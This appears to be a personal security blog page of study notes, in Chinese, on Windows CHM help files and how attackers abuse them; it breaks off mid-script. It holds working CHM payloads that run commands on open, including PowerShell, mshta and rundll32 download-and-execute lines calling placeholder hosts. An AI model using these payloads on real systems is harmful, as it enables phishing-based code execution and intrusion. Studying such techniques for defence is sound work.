@@ -1,0 +1,373 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>chm-study-notes | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="chm-study-notes"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> chm-study-notes</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="chm-study-notes"><a href="#chm-study-notes" class="headerlink" title="chm-study-notes"></a>chm-study-notes</h1><h2 id="0x00-CHM结构"><a href="#0x00-CHM结构" class="headerlink" title="0x00 CHM结构"></a>0x00 CHM结构</h2><p>​    chm文件由一系列html文件编译在一起，形成帮助文档，主要依靠一些配置文件来组织CHM的文件结构。</p>
+<pre><code>1. HTML help project (.hhp)配置文件。可以将它理解为CHM的配置文件，里面包含了首页和默认页、要打包的文件等信息。例子：
+</code></pre><span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[OPTIONS] </span><br><span class="line">Compatibility=1.1 or later</span><br><span class="line">Compiled file=PocCalc.chm                 </span><br><span class="line">Contents file=Table of Contents.hhc       </span><br><span class="line">Index file=Index.hhk                      </span><br><span class="line">Default topic=poc.html                    </span><br><span class="line">Title=PocCalc                             </span><br><span class="line">Display compile progress=No</span><br><span class="line">Language=0x410 Italian (Italy)</span><br><span class="line">Full-text search=Yes                </span><br><span class="line"></span><br><span class="line">[FILES] </span><br><span class="line">poc.html                                  </span><br><span class="line">Test7Z1.exe</span><br><span class="line"></span><br><span class="line">[INFOTYPES]</span><br></pre></td></tr></table></figure>
+<p>​    2. html源码文件。存储CHM当中的文本内容，管理组织图片, 按钮，快捷方式等呈现方式。攻击者一般会通过<code>ShortCut</code>的方式添加执行的恶意命令，在Item1的Value参数中指定运行的进程和参数。例如，用<code>ShortCut</code>来通过cmd来打开计算器：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>calc poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    command exec</span><br><span class="line">    <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,cmd /c, Calc&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>x.Click();<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>​    3. hhk索引页面地图。html格式的文件，用于保存CHM中<strong>关键字索引目录</strong>的内容。在<code>&lt;BODY&gt;</code>标签中以列举所有需要嵌入到chm文件中的附件文件对象，对象包含对象名Name和编译对象所在路径Local两个参数，设置的对象会在编译的时候编译到chm文件中。该文件在编译CHM文件过程中可忽略。示例如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;GENERATOR&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Microsoft® HTML Help Workshop 4.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Sitemap 1.0 --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">UL</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">LI</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">LI</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;World&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">UL</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​    4. hhc目录页面地图。用于保存CHM中目录页面索引的内容，在hhc文件中，用<code>&lt;UL&gt;</code>和<code>&lt;LI&gt;</code>两个标签定义了带有层级关系中列表，并在其中以<code>&lt;OBJECT&gt;</code>的形式嵌入了html页面对象。利用列表的层级关系，构造了最终chm文件的层级关系。（<strong>没看懂和3的区别</strong>）示例如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;GENERATOR&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Microsoft® HTML Help Workshop 4.1&quot;</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- Sitemap 1.0 --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/site properties&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ImageType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Folder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">UL</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">LI</span>&gt;</span> <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Test&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ImageNumber&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">UL</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x01-CHM的编译与反编译。"><a href="#0x01-CHM的编译与反编译。" class="headerlink" title="0x01 CHM的编译与反编译。"></a>0x01 CHM的编译与反编译。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hhc.exe &lt;目标hhp文件&gt;                         // 编译</span><br><span class="line">hh.exe  -decompile &lt;输出路径&gt; &lt;目标chm文件&gt;    // 反编译</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-CHM攻击方式"><a href="#0x02-CHM攻击方式" class="headerlink" title="0x02 CHM攻击方式"></a>0x02 CHM攻击方式</h2><p>​    参考的博客：</p>
+<p>​    <a target="_blank" rel="noopener" href="https://atsud0.me/2022/01/13/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/">https://atsud0.me/2022/01/13/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/</a></p>
+<h3 id="0x2-1-hhctrl-ocx对象命令执行"><a href="#0x2-1-hhctrl-ocx对象命令执行" class="headerlink" title="0x2.1 hhctrl.ocx对象命令执行"></a>0x2.1 hhctrl.ocx对象命令执行</h3><p>​    <strong>补充：</strong>hhctrl.ocx是Microsoft帮助文档界面相关文件。</p>
+<p>​    都是使用<code>ShortCut</code>函数实现的命令执行。</p>
+<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>calc poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	command exec</span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,powershell.exe, -nop -w hidden -e BASE64编码的字段&#x27;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&gt;&lt;PARAM name=&quot;Item1&quot; value=&#x27;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&quot;http://xx.xx.xx.xx&quot;))&#x27;&gt; 这段payload也可以&lt;--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>x.Click();<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="hta"><a href="#hta" class="headerlink" title="hta"></a>hta</h4><p>​    hta是HTML应用程序，直接将HTML保存成HTA的格式，就是一个独立的应用软件。该程序的源代码包括不止一种脚本语言，可以包括例如HTML和JavaScript。mshta可以执行.hta文件。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>calc poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	command exec</span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,mshta, http://x.x.x.x/loader.hta&#x27;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>x.Click();<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="rundll32运行JS"><a href="#rundll32运行JS" class="headerlink" title="rundll32运行JS"></a>rundll32运行JS</h4><p>​    ActiveXObject可以启用和返回对自动化对象的引用。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>calc poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	command exec</span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe, </span></span></span><br><span class="line"><span class="string"><span class="tag">     javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;              	 </span></span></span><br><span class="line"><span class="string"><span class="tag">     document.write();</span></span></span><br><span class="line"><span class="string"><span class="tag">     h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span></span><br><span class="line"><span class="string"><span class="tag">     h.Open(&quot;GET&quot;,&quot;http://xx.xx.xx.xx&quot;,false);</span></span></span><br><span class="line"><span class="string"><span class="tag">     try&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">     	h.Send();</span></span></span><br><span class="line"><span class="string"><span class="tag">     	b=h.ResponseText;</span></span></span><br><span class="line"><span class="string"><span class="tag">        eval(b);</span></span></span><br><span class="line"><span class="string"><span class="tag">     &#125;catch(e)&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">     	new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);</span></span></span><br><span class="line"><span class="string"><span class="tag">     &#125;&gt;&#x27;</span></span></span><br><span class="line"><span class="tag">	&lt;<span class="attr">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>x.Click();<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>​    为啥呢？看以下代码，在cmd窗口下运行就能弹窗。<strong>（具体原因见0x03）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure>
+<h3 id="0x2-2-释放文件并执行"><a href="#0x2-2-释放文件并执行" class="headerlink" title="0x2.2 释放文件并执行"></a>0x2.2 释放文件并执行</h3><p>​    以下都是将CHM压缩的文件释放到本地指定目录后，再执行。</p>
+<h4 id="hh释放文件Example"><a href="#hh释放文件Example" class="headerlink" title="hh释放文件Example"></a>hh释放文件Example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;t0&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!--&gt;获取目录&lt;--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function getPath()&#123; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var pathName = document.location.pathname;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var index0 = pathName.substr(1).indexOf(&quot;:&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var index1 = pathName.substr(1).lastIndexOf(&quot;:&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    var result = pathName.substr(index0+2,index1-index0-2);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    return result; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   